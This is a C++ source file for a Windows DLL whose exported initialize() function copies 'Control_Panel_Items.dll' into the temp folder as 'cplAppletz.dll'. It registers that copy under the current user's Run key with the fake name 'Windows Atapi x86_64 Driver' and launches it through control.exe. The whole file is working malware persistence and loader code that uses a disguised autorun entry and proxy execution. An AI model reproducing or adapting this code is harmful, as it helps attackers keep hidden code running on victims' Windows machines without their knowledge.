#include "initialization.h"
#include "pch.h"
#include <Windows.h>
#include <stdio.h>

#pragma warning(disable::4996)
#pragma comment (lib, "User32.lib")
#pragma comment (lib, "Advapi32.lib")

void CreateKeyAutoRun(char* fileName)
{
    char Driver[MAX_PATH];
    sprintf_s(Driver, "control %s", fileName);
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Windows Atapi x86_64 Driver", 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH);
    RegCloseKey(hKey);
}

extern "C" __declspec(dllexport) void initialize()
{
    char szWindowsPath[MAX_PATH];
    char szSystem32Path[MAX_PATH], szSysWOW64Path[MAX_PATH], szTempPath[MAX_PATH];
    
    //Get System Folder
    GetTempPathA(MAX_PATH, szTempPath);


    //Get File Name
    char szFilePath[MAX_PATH];
    GetModuleFileNameA(NULL, szFilePath, MAX_PATH);
    for (int i = strlen(szFilePath) - 1; i >= 0; --i)
    {
        if (szFilePath[i] == '\\')
        {
            szFilePath[i] = 0;
            break;
        }
    }
    strcat(szFilePath, "\\Control_Panel_Items.dll");
    
    //CopyFile and create key auto run
    char szNewFileName[MAX_PATH];
    sprintf(szNewFileName, "%s\\cplAppletz.dll", szTempPath);
    CopyFileA(szFilePath, szNewFileName, false);
    CreateKeyAutoRun(szNewFileName);

    //Execute command
    char commandLine[MAX_PATH];
    sprintf(commandLine, "control %s", szNewFileName);
    WinExec(commandLine, SW_NORMAL);
    
}